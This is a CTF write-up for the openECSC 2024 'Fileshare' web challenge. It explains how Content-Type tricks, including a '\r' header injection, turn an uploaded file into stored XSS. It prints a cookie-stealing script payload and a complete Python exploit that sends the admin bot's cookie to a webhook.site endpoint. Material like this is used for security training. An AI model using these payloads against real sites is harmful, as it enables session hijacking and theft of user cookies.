# openECSC 2024 - Round 1

## [web] Fileshare (257 solves)

You can now share your files for free thanks to our new disruptive technology!

Site: [https://fileshare.challs.open.ecsc2024.it](https://fileshare.challs.open.ecsc2024.it)

Author: Stefano Alberto <@Xato>

## Overview

The application allows uploading arbitrary files with a Content-Type that doesn't include the letter "h".

Then, you can report the uploaded file to the admin bot to be visited, the flag is stored as a cookie in the admin browser.


## Solution

To get the flag we need to force the admin bot to execute a script, there are multiple solution paths for this problem:

- Find a Content-Type allowing script execution, without the "h" letter, like `text/xml`.

- Abuse the content sniff feature of the browser by setting an invalid Content-Type.

- Adding the "\r" character in the Content-Type, causing the PHP code to refuse setting the header. This causes the server to use the default `text/html` value as Content-Type


Using the XSS we can easily leak the flag to a webhook with a payload similar to:

```html
<script>
    location = 'https://YOUR-WEBHOOK/?' + document.cookie;
</script>
```

## Exploit
```python
import requests
import re
import time

chall_url = "https://fileshare.challs.open.ecsc2024.it/"


r = requests.post('https://webhook.site/token')
token_id = r.json()['uuid']

payload = f'''
<script>
    location = 'https://webhook.site/{token_id}/?' + document.cookie;
</script>
'''

files = {
    'file': ('payload.html', payload, 'aaa\rbbb')
}

response = requests.post(chall_url + '/upload.php', files=files)

assert 'has been uploaded' in response.text

id = re.search(r'/download\.php\?id=(\w+)"', response.text)[1]

response = requests.post(chall_url + '/support.php', data={'fileid': id, 'message': 'test'})

assert 'Thank you, we are taking care of your problem!' in response.text

for _ in range(10):
    r = requests.get('https://webhook.site/token/'+ token_id +'/requests')

    for request in r.json()['data']:
        m = re.search(r'openECSC\{.+\}', request['url'])
        if (m):
           print(m.group(0))
           exit()
           
    time.sleep(2)

```
